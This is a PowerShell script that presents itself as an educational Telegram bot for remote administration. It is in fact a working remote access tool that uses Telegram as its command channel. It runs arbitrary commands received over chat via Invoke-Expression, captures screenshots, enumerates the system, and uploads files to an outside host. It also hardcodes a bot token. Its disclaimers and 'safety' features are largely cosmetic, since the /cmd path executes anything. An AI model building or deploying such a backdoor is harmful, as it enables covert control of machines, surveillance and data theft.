<#
.Educational Telegram Bot Remote Control Script
.DESCRIPTION:
    This script demonstrates remote administration concepts using Telegram Bot API.
    FOR EDUCATIONAL USE ONLY in isolated lab environments with explicit authorization.
.NOTES:
    Legal and Ethical Considerations:
    - Only use on systems you own or have explicit written permission to test
    - Understand applicable laws (Computer Fraud and Abuse Act, etc.)
    - Disclosure of unauthorized access is required by law in many jurisdictions
    - This tool is for learning about cybersecurity, not for malicious purposes
#>

#region Initial Configuration and Warnings
Write-Host "================================================" -ForegroundColor Red
Write-Host "EDUCATIONAL TELEGRAM BOT REMOTE CONTROL SCRIPT" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Red
Write-Host ""
Write-Host "WARNING: This script enables remote control of this system." -ForegroundColor Red
Write-Host "Only use in isolated lab environments you own or control." -ForegroundColor Red
Write-Host "Unauthorized access to computer systems is illegal." -ForegroundColor Red
Write-Host ""
Write-Host "Educational Purposes:" -ForegroundColor Green
Write-Host "1. Learn about remote administration concepts" -ForegroundColor Cyan
Write-Host "2. Understand API integration techniques" -ForegroundColor Cyan
Write-Host "3. Study PowerShell automation capabilities" -ForegroundColor Cyan
Write-Host "4. Explore cybersecurity implications" -ForegroundColor Cyan
Write-Host ""
Write-Host "By continuing, you acknowledge:" -ForegroundColor Yellow
Write-Host "- You have authorization to run this on the current system" -ForegroundColor Yellow
Write-Host "- You will not use this for unauthorized access" -ForegroundColor Yellow
Write-Host "- You understand the legal implications" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Red

$confirmation = Read-Host "Type 'I UNDERSTAND AND ACCEPT' to continue"
if ($confirmation -ne "I UNDERSTAND AND ACCEPT") {
    Write-Host "Execution cancelled." -ForegroundColor Green
    exit
}

# Configuration
$BotToken = "8351036185:AAFpuesdB0aA8h2peB2SOw6_Z5CZlPhwpEo"  # REPLACE with your bot token from @BotFather
$AuthorizedChatID = $null     # Will be set during initialization
$LogFile = "$env:TEMP\TelegramBot_Log_$(Get-Date -Format 'yyyyMMdd').txt"
$CommandDelay = 5             # Delay between commands for safety
$MaxFileSize = 5MB            # Safety limit for file transfers
$AllowedDownloadPaths = @("$env:USERPROFILE\Downloads", "$env:TEMP")
$LastUpdateID = 0

# Create log file header
"=== Educational Telegram Bot Remote Control Log ===" | Out-File -FilePath $LogFile
"Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $LogFile -Append
"User: $env:USERNAME" | Out-File -FilePath $LogFile -Append
"Computer: $env:COMPUTERNAME" | Out-File -FilePath $LogFile -Append
"==================================================" | Out-File -FilePath $LogFile -Append
#endregion

#region Telegram API Functions
<#
.SYNOPSIS
    Sends a message via Telegram Bot API
.DESCRIPTION
    Demonstrates HTTP REST API interaction with Telegram
.EDUCATIONAL NOTE:
    Shows how web APIs work using PowerShell's Invoke-RestMethod
    This is a common pattern for integrating with cloud services
#>
function Send-TelegramMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID,
        
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [string]$ParseMode = "Markdown"
    )
    
    try {
        $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
        $Body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = $ParseMode
        }
        
        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Body -ContentType "application/json"
        
        # Log the message sent
        "SENT [$(Get-Date -Format 'HH:mm:ss')] to $ChatID: $($Message.Substring(0, [Math]::Min($Message.Length, 50)))..." | Out-File -FilePath $LogFile -Append
        
        return $Response
    }
    catch {
        Write-Error "Failed to send message: $_"
        return $null
    }
}

<#
.SYNOPSIS
    Gets updates (messages) from Telegram Bot API
.DESCRIPTION
    Polling mechanism to receive commands - demonstrates asynchronous communication
.EDUCATIONAL NOTE:
    Shows polling vs webhooks for receiving data
    Real-world applications often use webhooks for better efficiency
#>
function Get-TelegramUpdates {
    [CmdletBinding()]
    param()
    
    try {
        $Uri = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($LastUpdateID + 1)&timeout=30"
        $Response = Invoke-RestMethod -Uri $Uri -Method Get
        
        if ($Response.ok -and $Response.result) {
            return $Response.result
        }
        return @()
    }
    catch {
        Write-Error "Failed to get updates: $_"
        return @()
    }
}

<#
.SYNOPSIS
    Sends a file via Telegram Bot API
.DESCRIPTION
    Demonstrates file upload via multipart/form-data
.EDUCATIONAL NOTE:
    Shows how to handle binary data transfer through APIs
    Important for understanding file transfer protocols
#>
function Send-TelegramFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID,
        
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        
        [Parameter(Mandatory=$false)]
        [string]$Caption = ""
    )
    
    try {
        # Safety check: file size limit
        $FileSize = (Get-Item $FilePath).Length
        if ($FileSize -gt $MaxFileSize) {
            Send-TelegramMessage -ChatID $ChatID -Message "‚ùå File too large ($([Math]::Round($FileSize/1MB,2)) MB). Max size: $([Math]::Round($MaxFileSize/1MB,2)) MB"
            return $false
        }
        
        # Safety check: prevent system file access
        $SystemPaths = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\System Volume Information")
        foreach ($path in $SystemPaths) {
            if ($FilePath -like "$path*") {
                Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Access to system directories is blocked for safety"
                return $false
            }
        }
        
        $Uri = "https://api.telegram.org/bot$BotToken/sendDocument"
        $Form = @{
            chat_id = $ChatID
            document = Get-Item -Path $FilePath
        }
        
        if ($Caption) {
            $Form.caption = $Caption
        }
        
        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Form $Form
        
        "FILE SENT [$(Get-Date -Format 'HH:mm:ss')] to $ChatID: $FilePath" | Out-File -FilePath $LogFile -Append
        return $true
    }
    catch {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Failed to send file: $($_.Exception.Message)"
        return $false
    }
}
#endregion

#region Core Remote Control Functions
<#
.SYNOPSIS
    Executes a PowerShell command safely
.DESCRIPTION
    Demonstrates remote command execution with safety checks
.EDUCATIONAL NOTE:
    Shows the power and danger of unrestricted command execution
    Emphasizes the need for input validation in remote administration tools
#>
function Invoke-RemoteCommand {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command,
        
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    # Log the command
    "CMD [$(Get-Date -Format 'HH:mm:ss')] from $ChatID: $Command" | Out-File -FilePath $LogFile -Append
    
    # Safety: Block dangerous commands in educational context
    $BlockedCommands = @(
        "Format-Volume", "Remove-Item -Force -Recurse", "Stop-Computer",
        "Restart-Computer", "Clear-EventLog", "Disable-WindowsOptionalFeature"
    )
    
    foreach ($blocked in $BlockedCommands) {
        if ($Command -like "*$blocked*") {
            $Message = "‚ùå Command blocked for safety: $blocked`nEducational note: This command could cause data loss or system instability."
            Send-TelegramMessage -ChatID $ChatID -Message $Message
            return
        }
    }
    
    try {
        # Execute command with timeout
        $Result = Invoke-Expression -Command $Command -ErrorAction Stop 2>&1
        
        # Convert result to string, truncate if too long
        $ResultString = $Result | Out-String
        if ($ResultString.Length -gt 4000) {
            $ResultString = $ResultString.Substring(0, 4000) + "`n`n[Output truncated for Telegram message length limits]"
        }
        
        # Escape Markdown special characters
        $ResultString = $ResultString -replace '([_*[\]()~`>#+\-=|{}.!])', '\$1'
        
        Send-TelegramMessage -ChatID $ChatID -Message "‚úÖ Command executed:`n```powershell`n$Command`n````nOutput:`n```$ResultString```"
    }
    catch {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Error executing command:`n```$Command`n````nError:`n```$($_.Exception.Message)```"
    }
}

<#
.SYNOPSIS
    Takes a screenshot (with user notification)
.DESCRIPTION
    Demonstrates screen capture capabilities
.EDUCATIONAL NOTE:
    Highlights privacy implications of remote screen capture
    Shows how to use .NET assemblies in PowerShell
#>
function Take-Screenshot {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    try {
        # Educational notification
        Send-TelegramMessage -ChatID $ChatID -Message "üì∏ *Screenshot Requested*`n`nEducational Note: This demonstrates screen capture capability. In real scenarios, users should be notified and give consent."
        
        Add-Type -AssemblyName System.Drawing
        
        # Capture screenshot
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size)
        
        $FilePath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
        $Graphics.Dispose()
        $Bitmap.Dispose()
        
        # Send file with educational note
        Send-TelegramFile -ChatID $ChatID -FilePath $FilePath -Caption "Screenshot captured for educational purposes. Demonstrates screen capture API usage."
        
        # Cleanup
        Remove-Item -Path $FilePath -Force
    }
    catch {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Failed to take screenshot: $($_.Exception.Message)"
    }
}

<#
.SYNOPSIS
    Gets system information
.DESCRIPTION
    Demonstrates system enumeration techniques
.EDUCATIONAL NOTE:
    Shows what information can be gathered remotely
    Important for understanding system inventory and reconnaissance
#>
function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    try {
        $OS = Get-CimInstance Win32_OperatingSystem
        $Computer = Get-CimInstance Win32_ComputerSystem
        $Disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
        
        $DiskInfo = foreach ($disk in $Disks) {
            $FreeGB = [Math]::Round($disk.FreeSpace / 1GB, 2)
            $TotalGB = [Math]::Round($disk.Size / 1GB, 2)
            $UsedGB = $TotalGB - $FreeGB
            "$($disk.DeviceID): $UsedGB/$TotalGB GB used ($FreeGB GB free)"
        }
        
        $Info = @"
üñ•Ô∏è *System Information* (Educational Demo)

*OS:* $($OS.Caption)
*Version:* $($OS.Version)
*Architecture:* $($OS.OSArchitecture)
*Last Boot:* $($OS.LastBootUpTime)

*Computer:* $($Computer.Name)
*Manufacturer:* $($Computer.Manufacturer)
*Model:* $($Computer.Model)
*RAM:* $([Math]::Round($Computer.TotalPhysicalMemory/1GB, 2)) GB

*Disk Space:*
$($DiskInfo -join "`n")

*Logged in User:* $env:USERNAME
*User Domain:* $env:USERDOMAIN

*Educational Note:* This shows system enumeration capabilities.
"@
        
        Send-TelegramMessage -ChatID $ChatID -Message $Info
    }
    catch {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Failed to get system info: $($_.Exception.Message)"
    }
}

<#
.SYNOPSIS
    Lists running processes
.DESCRIPTION
    Demonstrates process enumeration
.EDUCATIONAL NOTE:
    Shows how to identify running applications and services
    Useful for system monitoring and troubleshooting
#>
function Get-RunningProcesses {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    try {
        $Processes = Get-Process | Select-Object -First 20 | ForEach-Object {
            "‚Ä¢ $($_.Name) (PID: $($_.Id), Memory: $([Math]::Round($_.WS/1MB, 2)) MB)"
        }
        
        $Message = @"
üìä *Top 20 Running Processes*

$($Processes -join "`n")

*Educational Note:* Process enumeration helps in system monitoring and identifying suspicious activity.
"@
        
        Send-TelegramMessage -ChatID $ChatID -Message $Message
    }
    catch {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Failed to get processes: $($_.Exception.Message)"
    }
}

<#
.SYNOPSIS
    Handles file download requests
.DESCRIPTION
    Demonstrates secure file transfer with safety restrictions
.EDUCATIONAL NOTE:
    Shows importance of path validation and size limits
    Critical for understanding secure file transfer implementations
#>
function Download-File {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    # Safety: Check if path is in allowed directories
    $IsAllowed = $false
    foreach ($allowedPath in $AllowedDownloadPaths) {
        if ($FilePath -like "$allowedPath*") {
            $IsAllowed = $true
            break
        }
    }
    
    if (-not $IsAllowed) {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Access denied. Files can only be downloaded from: $($AllowedDownloadPaths -join ', ')"
        return
    }
    
    if (Test-Path $FilePath) {
        Send-TelegramFile -ChatID $ChatID -FilePath $FilePath -Caption "File download for educational purposes"
    } else {
        Send-TelegramMessage -ChatID $ChatID -Message "‚ùå File not found: $FilePath"
    }
}

<#
.SYNOPSIS
    Self-termination command
.DESCRIPTION
    Provides a way to stop the remote control session
.EDUCATIONAL NOTE:
    Shows importance of having kill switches in remote tools
    Critical for maintaining control over deployed tools
#>
function Stop-RemoteControl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChatID
    )
    
    $Message = @"
üõë *Remote Control Session Terminated*

All remote control functions have been disabled.
The bot will no longer respond to commands.

*Educational Conclusion:*
- This demonstrated remote administration concepts
- Showed API integration techniques
- Highlighted security implications
- Emphasized responsible use of such tools

Log file saved to: $LogFile
"@
    
    Send-TelegramMessage -ChatID $ChatID -Message $Message
    "SESSION TERMINATED [$(Get-Date -Format 'HH:mm:ss')] by $ChatID" | Out-File -FilePath $LogFile -Append
    exit
}
#endregion

#region Initialization
<#
.SYNOPSIS
    Initializes the bot and gets authorized chat ID
.DESCRIPTION
    Security measure to ensure only authorized users can control the system
.EDUCATIONAL NOTE:
    Demonstrates authentication and authorization concepts
    Shows why access control is critical in remote administration
#>
function Initialize-Bot {
    Write-Host "Initializing Telegram Bot..." -ForegroundColor Cyan
    Write-Host "Please send a message to your bot on Telegram" -ForegroundColor Yellow
    Write-Host "Waiting for initial contact..." -ForegroundColor Yellow
    
    while ($true) {
        try {
            $Updates = Get-TelegramUpdates
            
            foreach ($Update in $Updates) {
                $LastUpdateID = $Update.update_id
                
                if ($Update.message -and $Update.message.text) {
                    $ChatID = $Update.message.chat.id
                    $MessageText = $Update.message.text
                    $Username = $Update.message.from.username
                    
                    if ($MessageText -eq "/start") {
                        # First contact - authorize this chat
                        $global:AuthorizedChatID = $ChatID
                        
                        $WelcomeMessage = @"
ü§ñ *Educational Remote Control Bot Initialized*

*Authorized User:* @$Username
*Chat ID:* $ChatID
*Time:* $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
*System:* $env:COMPUTERNAME\$env:USERNAME

‚ö†Ô∏è *IMPORTANT EDUCATIONAL NOTES:*
1. This tool is for learning purposes ONLY
2. Only use on systems you own or have permission to test
3. All commands are logged: $LogFile
4. There is a $CommandDelay-second delay between commands
5. File operations are restricted to non-system directories

*Available Commands:*
‚Ä¢ /help - Show this help
‚Ä¢ /cmd [command] - Execute PowerShell command
‚Ä¢ /sysinfo - Get system information
‚Ä¢ /processes - List running processes
‚Ä¢ /screenshot - Take screenshot (with notification)
‚Ä¢ /download [path] - Download file (restricted paths)
‚Ä¢ /stop - Terminate remote control session

*Educational Purpose:* Learn about remote administration, API integration, and cybersecurity implications.
"@
                        
                        Send-TelegramMessage -ChatID $ChatID -Message $WelcomeMessage
                        Write-Host "Bot initialized! Authorized Chat ID: $ChatID" -ForegroundColor Green
                        Write-Host "You can now send commands from Telegram" -ForegroundColor Green
                        
                        "BOT INITIALIZED [$(Get-Date -Format 'HH:mm:ss')] ChatID: $ChatID, User: @$Username" | Out-File -FilePath $LogFile -Append
                        
                        return
                    }
                }
            }
            
            Start-Sleep -Seconds 2
        }
        catch {
            Write-Host "Error during initialization: $_" -ForegroundColor Red
            Start-Sleep -Seconds 5
        }
    }
}
#endregion

#region Main Loop
<#
.SYNOPSIS
    Main command processing loop
.DESCRIPTION
    Continuously checks for and processes authorized commands
.EDUCATIONAL NOTE:
    Demonstrates event-driven programming and command parsing
    Shows how to build a responsive remote control interface
#>
function Start-CommandLoop {
    Write-Host "Starting command loop..." -ForegroundColor Cyan
    Write-Host "All commands will be logged to: $LogFile" -ForegroundColor Yellow
    Write-Host "Press Ctrl+C to stop" -ForegroundColor Yellow
    
    while ($true) {
        try {
            $Updates = Get-TelegramUpdates
            
            foreach ($Update in $Updates) {
                $LastUpdateID = $Update.update_id
                
                if ($Update.message -and $Update.message.text -and $Update.message.chat.id -eq $AuthorizedChatID) {
                    $ChatID = $Update.message.chat.id
                    $MessageText = $Update.message.text
                    $Username = $Update.message.from.username
                    
                    # Log received command
                    "RCVD [$(Get-Date -Format 'HH:mm:ss')] from $ChatID (@$Username): $MessageText" | Out-File -FilePath $LogFile -Append
                    
                    # Parse and execute command
                    switch -regex ($MessageText) {
                        '^/help$' {
                            $HelpMessage = @"
üìö *Educational Remote Control Bot Help*

*Purpose:* Learn about remote administration concepts

*Commands:*
‚Ä¢ /help - Show this help
‚Ä¢ /cmd [powershell command] - Execute PowerShell command
‚Ä¢ /sysinfo - Get system information
‚Ä¢ /processes - List running processes
‚Ä¢ /screenshot - Take screenshot
‚Ä¢ /download [full path] - Download file
‚Ä¢ /stop - Terminate session

*Safety Features:*
‚Ä¢ $CommandDelay-second command delay
‚Ä¢ File size limit: $([Math]::Round($MaxFileSize/1MB,2)) MB
‚Ä¢ Restricted file paths
‚Ä¢ Command logging
‚Ä¢ Blocked dangerous commands

*Educational Value:*
1. API Integration
2. Remote Administration
3. Security Implications
4. PowerShell Automation
"@
                            Send-TelegramMessage -ChatID $ChatID -Message $HelpMessage
                        }
                        
                        '^/cmd (.+)$' {
                            $Command = $Matches[1]
                            Start-Sleep -Seconds $CommandDelay  # Safety delay
                            Invoke-RemoteCommand -Command $Command -ChatID $ChatID
                        }
                        
                        '^/sysinfo$' {
                            Start-Sleep -Seconds $CommandDelay
                            Get-SystemInfo -ChatID $ChatID
                        }
                        
                        '^/processes$' {
                            Start-Sleep -Seconds $CommandDelay
                            Get-RunningProcesses -ChatID $ChatID
                        }
                        
                        '^/screenshot$' {
                            Start-Sleep -Seconds $CommandDelay
                            Take-Screenshot -ChatID $ChatID
                        }
                        
                        '^/download (.+)$' {
                            $FilePath = $Matches[1]
                            Start-Sleep -Seconds $CommandDelay
                            Download-File -FilePath $FilePath -ChatID $ChatID
                        }
                        
                        '^/stop$' {
                            Start-Sleep -Seconds $CommandDelay
                            Stop-RemoteControl -ChatID $ChatID
                        }
                        
                        default {
                            if ($MessageText -match '^/') {
                                Send-TelegramMessage -ChatID $ChatID -Message "‚ùå Unknown command. Use /help for available commands."
                            }
                        }
                    }
                }
            }
            
            Start-Sleep -Seconds 1
        }
        catch {
            Write-Host "Error in command loop: $_" -ForegroundColor Red
            Start-Sleep -Seconds 5
        }
    }
}
#endregion

# Main Execution
try {
    # Test API connectivity
    Write-Host "Testing Telegram API connectivity..." -ForegroundColor Cyan
    $Test = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getMe" -ErrorAction Stop
    if ($Test.ok) {
        Write-Host "‚úì Connected to Telegram Bot: @$($Test.result.username)" -ForegroundColor Green
    }
}
catch {
    Write-Host "‚ùå Failed to connect to Telegram API. Please check your bot token and internet connection." -ForegroundColor Red
    Write-Host "Error: $_" -ForegroundColor Red
    exit 1
}

# Initialize and start
Initialize-Bot
Start-CommandLoop
